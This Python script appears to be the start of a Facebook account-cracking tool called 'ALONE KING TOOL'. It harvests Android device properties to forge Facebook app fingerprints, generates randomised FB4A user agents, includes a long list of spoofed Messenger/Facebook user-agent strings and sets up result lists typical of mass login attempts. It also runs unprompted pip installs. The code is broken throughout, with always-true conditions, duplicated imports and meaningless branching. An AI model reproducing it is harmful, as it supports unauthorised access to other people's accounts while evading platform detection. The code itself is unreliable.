

import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import os
import random
import sys
import time
import uuid
import rich
import json
import subprocess
import random
import string
import urllib3
import rich
import base64
from os import system as c
import marshal
import base64
import zlib
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import marshal
import base64
import zlib
from os import path
import os
import base64
import zlib
import pip
import urllib
os.system('clear')
import os
import uuid
import base64
import requests
import zlib
import httpx
import time
import platform
import datetime
import os
import sys
import tempfile
import string
import random
import subprocess
import uuid
from time import localtime as lt
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
import platform
import httpx
from string import *
from concurrent.futures import ThreadPoolExecutor as ALONE
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    os.system('pip install requests futures==2 > /dev/null')
pretty.install()
CON = sol()
from os import path
import requests
import random
import uuid
import string
import hashlib
import json
from os import path
from urllib.request import urlopen
import os
import base64
import zlib
import pip
import urllib
import urllib3
import platform
import math
import smtplib
import platform
import smtplib
import math
import os
import base64
import zlib
import pip
import urllib

def clear():
    os.system('clear')

print('\x1b[1;91m[\x1b[1;92m●\x1b[1;91m]\x1b[38;5;46m WELCOME TO ALONE KING TOOL')
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python ALONE.py')
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
total = 0
for i in fbcr:
    total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    if Exception:
        e = None
        fbcr = 'Zong'
        sim_id += fbcr
        e = None
        del e
        e = None
        del e
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }
loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
uid = []
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
M1 = '\x1b[1;31m'

def clear():
    os.system('clear')
    print(logo)


def linex():
    print(f'''{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')


def ua():
    vivo = random.choice([
        'U3',
        '1002T',
        'C',
        '1605',
        '730',
        'A5',
        'A54',
        'a57',
        'A87',
        'C8818',
        'EGO',
        'E1',
        'E3',
        'E5',
        'X21',
        'X21i',
        'X2s',
        'X23',
        'iQOO',
        'X5Max5',
        'X5V',
        'X60t',
        'X6S',
        'X7',
        'X70',
        'Xplay',
        'Xshot',
        'Y01',
        'Y01A',
        'Y02',
        'Y02s',
        'V1',
        'V11',
        'V11s',
        'Y13T',
        'Nex',
        'S1',
        'S10',
        'S11',
        'S11t',
        'S12',
        'S13',
        'S15',
        'S15e',
        'S1PRO',
        'S20',
        'S21',
        'S31',
        'S5',
        'S6',
        'S6T',
        'S7',
        'S76',
        'S7e',
        'S7t',
        'S7w',
        'S9',
        'S9e',
        'T1',
        'T1x',
        'T2',
        'T2x',
        'E1',
        'U10',
        'U20',
        'X20',
        'X1w',
        '23x',
        'V77e',
        'Y613F',
        'Y628',
        'X3S',
        'Z1',
        'Z10',
        'Z1i',
        'Z1LITE',
        'Z1PRO',
        'Z1x',
        'Z34'])
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.48.' + '122;FBBV/' + str(random.randint(1111111, 9999999)) + ';FBDM/{density=2' + '.0,width=' + '720,height=' + '1456};FBLC/it_IT;FBRV/273474118;FBCR/I TIM;FBMF/VIVO;FBBD/VIVO;FBPN/com.facebook.katana;FBDV/' + str(vivo) + ';FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
    return ua

ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 9; SM-J701MT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 7.1.1; SM-T560NU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52']
ua = [
    'Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36']
ua = [
    'Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36']
[
    'Dalvik\\/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build\\/LRX22C) [FBAN\\/Orca-Android;FBAV\\/130.0.0.15.89;FBPN\\/com.facebook.orca;FBLC\\/sv_SE;FBBV\\/67467545;FBCR\\/S COMVIQ;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/GT-I9505;FBSV\\/5.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/187.0.0.43.81;FBPN\\/com.facebook.katana;FBLC\\/fr_FR;FBBV\\/122388438;FBCR\\/Bouygues Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G930F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,h',
    'Dalvik\\/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build\\/MMB29Q) Source\\/1 [FBAN\\/EMA;UNITY_PACKAGE\\/342;FBBV\\/107586706;FBAV\\/99.0.0.8.182;FBDV\\/SM-J210F;FBLC\\/en_US;FBOP\\/20]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/196.0.0.29.99;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/135374479;FBCR\\/AIS;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A720F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.4.4; Z987 Build\\/KTU84P) [FBAN\\/Orca-Android;FBAV\\/44.0.0.8.52;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/16048044;FBCR\\/cricket;FBMF\\/zte;FBBD\\/zte;FBDV\\/Z987;FBSV\\/4.4.4;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1184};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/220.0.0.20.121;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/159507260;FBCR\\/MegaFon;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G950U;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2768};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build\\/JLS36C) [FBAN\\/FB4A;FBAV\\/175.0.0.40.97;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/111983758;FBCR\\/Viettel Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G925F;FBSV\\/5.1.1;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=1280,height=720};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build\\/NJH47F) [FBAN\\/Orca-Android;FBAV\\/230.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/en_EG;FBBV\\/169378254;FBCR\\/Android;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N9005;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=720,height=1280};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build\\/O11019) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/th_TH;FBBV\\/182747440;FBCR\\/TRUE-H;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1909;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=1424,height=720};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/182747450;FBCR\\/GLOBE;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1 Cookie VaHe******************** Edit',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A505GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/182747450;FBCR\\/GLOBE;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1423};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A205GN Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/242.0.0.15.119;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/184324652;FBCR\\/TM;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A205GN;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1423};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; AGS2-L09 Build\\/HUAWEIAGS2-L09) [FBAN\\/Orca-Android;FBAV\\/238.0.0.14.120;FBPN\\/com.facebook.orca;FBLC\\/hu_HU;FBBV\\/179092826;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/AGS2-L09;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=1200,height=1852};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; LML713DL Build\\/OPM1.171019.019) [FBAN\\/Orca-Android;FBAV\\/244.0.0.16.236;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/187555057;FBCR\\/null;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LML713DL;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=2034};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; CPH1987 Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/244.0.0.16.236;FBPN\\/com.facebook.orca;FBLC\\/vi_VN;FBBV\\/187555175;FBCR\\/VIETTEL;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1987;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=2196};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; Hisense Hi  3 Build\\/NRD9OM) [FBAN\\/FB4A;FBAV\\/245.0.0.39.118;FBPN\\/ com.facebook.katana;FBLC\\/es_MX;FBBV\\/ 180475968;FBCR\\/TELCEL;FBMF\\/Hisense;FBBD\\/ Hisense;FBDV\\/Hisense Hi 3;FBSV\\/7.0;FBCA\\/armeabi- v7a:armeabi;FBDM\\/ {density=2.0,width=720height=1280};FB_FW\\/1;FBRV\\/181817659;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; SM-G930F Build\\/NRD90M) [FBAN\\/Orca-Android;FBAV\\/247.0.0.10.117',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/233.0.0.16.158;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/172917909;FBCR\\/null;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo V3Max;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build\\/LMY47V) [FBAN\\/Orca-Android;FBAV\\/233.0.0.16.158;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/172917909;FBCR\\/null;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo V3Max;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; POT-LX1 Build\\/HUAWEIPOT-L01) [FBAN\\/Orca-Android;FBAV\\/251.0.0.12.117;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/197803941;FBCR\\/O2-CZ;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/POT-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1426};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-N975U Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/253.0.0.17.117;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/200372525;FBCR\\/U.S. Cellular;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N975U;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.5,width=1440,height=2759};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-N960F Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/257.1.0.21.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/205865103;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-N960F;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2094};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; moto e6 Build\\/PCB29.73-65-3) [FBAN\\/Orca-Android;FBAV\\/235.1.0.9.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/175782189;FBCR\\/Metro by T-Mobile;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e6;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1344};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G955F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/255.0.0.14.126;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/202766316;FBCR\\/SUN;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G955F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.5,width=1440,height=2960};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G955F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/255.0.0.14.126;FBPN\\/com.facebook.orca;FBLC\\/en_PH;FBBV\\/202766316;FBCR\\/SUN;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G955F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build\\/HUAWEIDRA-LX2) [FBAN\\/Orca-Android;FBAV\\/239.1.0.17.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/180535023;FBCR\\/TelkomSA;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/DRA-LX2;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1356};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; E6653 Build\\/32.4.A.1.54) [FBAN\\/Orca-Android;FBAV\\/151.0.0.17.95;FBPN\\/com.facebook.orca;FBLC\\/en_ZA;FBBV\\/89897644;FBCR\\/null;FBMF\\/Sony;FBBD\\/Sony;FBDV\\/E6653;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1776};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build\\/IMM76D) [FBAN\\/\\xC2\\xADOrca-Android;FBAV\\/\\xC2\\xAD5.0.0.16.1;FBLC\\/\\xC2\\xADtr_TR;FBBV\\/\\xC2\\xAD2302400;FBCR\\/\\xC2\\xADT-Mobile;FBMF\\/\\xC2\\xADsamsung;FBBD\\/\\xC2\\xADsamsung;FBDV\\/\\xC2\\xADGT-I9300;FBSV\\/\\xC2\\xAD4.0.4;FBCA\\/\\xC2\\xADarmeabi-v7a:armeabi;F\\xC2\\xADBDM\\/\\xC2\\xAD{density=1.0,width=10\\xC2\\xAD66,height=552};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-G970U1 Build\\/QP1A.190711.020) [FBAN\\/MessengerLite;FBAV\\/78.0.1.18.236;FBPN\\/com.facebook.mlite;FBLC\\/es_MX;FBBV\\/201616056;FBCR\\/TELCEL;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G970U1;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2020};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; POT-LX3 Build\\/HUAWEIPOT-L03) [FBAN\\/Orca-Android;FBAV\\/270.0.0.17.120;FBPN\\/com.facebook.orca;FBLC\\/es_MX;FBBV\\/225129965;FBCR\\/TELCEL;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/POT-LX3;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2139};FB_FW\\/1;] Cookie yQHE********************',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build\\/NS6315) [FBAN\\/Orca-Android;FBAV\\/235.1.0.9.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/175782190;FBCR\\/null;FBMF\\/Amazon;FBBD\\/Amazon;FBDV\\/KFMUWI;FBSV\\/7.1.2;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.0,width=600,height=976};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Pixel 3 Build\\/QQ3A.200605.001) [FBAN\\/Orca-Android;FBAV\\/271.0.0.11.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/227270208;FBCR\\/Verizon;FBMF\\/Google;FBBD\\/google;FBDV\\/Pixel 3;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2028};FB_FW\\/1;] FBBK\\/1\\',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; VOG-L29 Build\\/HUAWEIVOG-L29) [FBAN\\/Orca-Android;FBAV\\/272.0.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/228977692;FBCR\\/vodafone ES;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/VOG-L29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2265};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build\\/OPPS27.91-179-8-16) [FBAN\\/FB4A;FBAV\\/287.0.0.50.119;FBPN\\/com.facebook.katana;FBLC\\/es_MX;FBBV\\/243660864;FBCR\\/null;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e5 plus;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.7,width=720,height=1358};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-J730F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/245106334;FBCR\\/Plus;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J730F;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=1920};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A505GT Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/245106389;FBCR\\/Claro BR;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GT;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2113};FB_FW\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-A505GT Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/245106389;FBCR\\/Claro BR;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A505GT;FBSV\\/10;FBCA\\/arm64-',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI\\/V11.0.1.0.QFGEUXM) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/245106389;FBCR\\/null;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2131};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; EVR-N29 Build\\/HUAWEIEVR-N29) [FBAN\\/Orca-Android;FBAV\\/283.0.0.16.120;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/246887380;FBCR\\/O2 - UK;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/EVR-N29;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2068};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build\\/MMB29T) [FBAN\\/FB4A;FBAV\\/273.0.0.39.123;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/218047938;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G532G;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.5,width=540,height=960};FB_FW\\/1;FBRV\\/219557400;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build\\/R16NW) [FBAN\\/Orca-Android;FBAV\\/260.0.0.22.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/209190396;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G960U;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=2076};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-G950U Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/282.0.0.10.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/245106389;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G950U;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2076};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; LG-H901 Build\\/NRD90U) [FBAN\\/Orca-Android;FBAV\\/286.0.0.21.122;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/250669427;FBCR\\/T-Mobile;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LG-H901;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2392};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; SM-A305F Build\\/PPR1.180610.011) [FBAN\\/Orca-Android;FBAV\\/274.0.0.18.120;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/232793953;FBCR\\/airtel;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A305F;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2131};FB_FW\\/1;]',
